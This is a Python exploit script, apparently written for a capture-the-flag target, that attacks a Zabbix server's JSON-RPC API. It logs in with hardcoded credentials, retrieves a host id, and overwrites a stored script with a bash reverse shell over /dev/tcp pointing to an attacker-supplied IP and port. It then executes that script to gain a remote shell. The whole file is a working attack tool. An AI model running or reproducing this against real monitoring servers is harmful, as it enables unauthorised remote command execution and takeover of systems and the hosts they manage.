#!/usr/bin/python

import requests, json, sys

if len(sys.argv) < 4:
    print("[-]usage: %s targetIP attackerIP attackerPort"%(sys.argv[0]))
    exit(0)

targetIP = sys.argv[1]
attackerIP = sys.argv[2]
attackerPort = sys.argv[3]


url = "http://%s/zabbix/api_jsonrpc.php"%(targetIP)

username = "zipper"
password = "zipper"

headers = {"Content-type": "application/json-rpc"}
proxies = {"http": "http://127.0.0.1:8080"}
login_data = {
    "jsonrpc": "2.0",
    "method": "user.login",
    "params": {
        "user": "zapper",
        "password": "zapper"
    },
    "id": 1
}
req = requests.post(url=url, data=json.dumps(login_data),headers=headers, proxies=proxies)

res = req.json()
authToken = res["result"]
print("[+] Login Successful")

hostget_data = {
    "jsonrpc": "2.0",
    "method": "host.get",
    "params": {
    },
    "auth": authToken,
    "id": 1
}
req = requests.post(url=url, data=json.dumps(hostget_data),headers=headers, proxies=proxies)

res = req.json()
hostid = res["result"][0]["hostid"]
print("[+] Got hostid")

cmd = 'bash -c \'bash -i >& /dev/tcp/%s/%s 0>&1\''%(attackerIP, attackerPort)
scriptupdate_data = {
    "jsonrpc": "2.0",
    "method": "script.update",
    "params": {
        "scriptid":"2",
        "command": cmd
    },
    "auth": authToken,
    "id": 1
}
req = requests.post(url=url, data=json.dumps(scriptupdate_data),headers=headers, proxies=proxies)

res = req.json()
print("[+] Script Updated")

scriptexecute_data = {
    "jsonrpc": "2.0",
    "method": "script.execute",
    "params": {
        "scriptid":"2",
        "hostid": hostid
    },
    "auth": authToken,
    "id": 1
}
req = requests.post(url=url, data=json.dumps(scriptexecute_data),headers=headers, proxies=proxies)

res = req.json()
print("[+] Script Executed")


